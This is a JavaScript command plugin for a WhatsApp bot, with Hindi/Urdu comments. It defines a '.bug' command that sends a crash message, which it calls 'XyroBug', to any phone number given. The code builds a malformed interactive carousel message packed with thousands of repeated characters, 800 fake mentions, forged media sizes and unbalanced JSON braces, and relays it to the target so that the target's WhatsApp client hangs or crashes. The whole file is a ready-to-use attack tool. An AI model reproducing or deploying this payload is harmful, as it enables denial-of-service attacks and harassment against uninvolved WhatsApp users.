const { cmd } = require('../inconnuboy');
const crypto = require('crypto');
const chalk = require('chalk'); // agar use kar rahe ho to

async function XyroBug(client, target) {
    try {
        console.log(chalk.red(`[BUG] Sending to ${target}`));

        const bigText = "🦠⃟༑⌁⃰𝗬𝗮𝗸𝘂𝘇𝗮 𝗖𝗿𝗮𝘀𝗵𝗲𝗿ཀ͡";
        const repeatCount = 12000; // zyada mat badhao, hang ho jayega

        const mentioned = Array.from({ length: 800 }, () => 
            "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
        );

        const message = {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2,
                        messageSecret: crypto.randomBytes(32),
                    },
                    interactiveMessage: {
                        contextInfo: {
                            participant: target,
                            mentionedJid: ["0@s.whatsapp.net", ...mentioned],
                            remoteJid: "status@broadcast",
                            forwardingScore: 999999,
                            isForwarded: true,
                        },
                        carouselMessage: {
                            messageVersion: 1,
                            cards: [{
                                header: {
                                    title: bigText + "ꦾ".repeat(repeatCount),
                                    hasMediaAttachment: true,
                                    imageMessage: {
                                        url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
                                        mimetype: "image/jpeg",
                                        fileLength: "999999999",
                                        height: 9999,
                                        width: 9999,
                                        mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
                                        fileEncSha256: "D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
                                        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAAAQIDBAYBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAPnZTmbzuox0TmBCtSqZ3yncZNbamucUMszSBoWtXBzoUxZNO2enF6Mm+Ms1xoSaKmjOwnIcQJ//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBIgITEDQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//8QAHBEAAgICAwAAAAAAAAAAAAAAAQIAEgEhEBJR/9oACAEDAQE/AKOiw7YoRELToaGwSM4M5t6b/9k=",
                                    }
                                },
                                body: { 
                                    text: bigText + "ꦾ".repeat(4000) 
                                },
                                nativeFlowMessage: {
                                    buttons: [
                                        { name: "single_select", buttonParamsJson: "" },
                                        { name: "cta_call", buttonParamsJson: JSON.stringify({ status: true }) },
                                        { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(3000) }) },
                                        { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(3000) }) },
                                    ],
                                    messageParamsJson: "{".repeat(4500)
                                }
                            }]
                        }
                    }
                }
            }
        };

        await client.relayMessage(target, message, {
            messageId: Date.now().toString() + Math.random().toString(36).substr(2),
        });

        console.log(chalk.green(`[+] Bug Sent Successfully to ${target}`));

    } catch (e) {
        console.error(chalk.red("Bug Error:"), e.message);
    }
}

// ==================== COMMAND ====================

cmd({
    pattern: "bug",
    desc: "Send WhatsApp Crash/Bug",
    category: "bugs",
    react: "💥",
    filename: __filename
}, async (conn, mek, msg, options) => {
    try {
        const { reply, args = [] } = options || {};

        let target = args[0] ? args[0].trim() : null;

        if (!target && msg?.quoted?.sender) {
            target = msg.quoted.sender;
        }

        if (!target) {
            return reply(`❌ *Usage:*\n\n.bug 923001234567\n\nYa kisi message ko reply karke .bug likho`);
        }

        let number = String(target).replace(/[^0-9]/g, '');
        
        if (number.length < 10) {
            return reply("❌ Invalid Number!");
        }

        const finalTarget = number + "@s.whatsapp.net";

        await reply(`⏳ Sending bug to ${number}...`);
        
        await XyroBug(conn, finalTarget);
        
        await reply(`✅ Bug Sent to ${number}`);

    } catch (error) {
        console.error(error);
        await reply("❌ Error occurred while sending bug");
    }
});
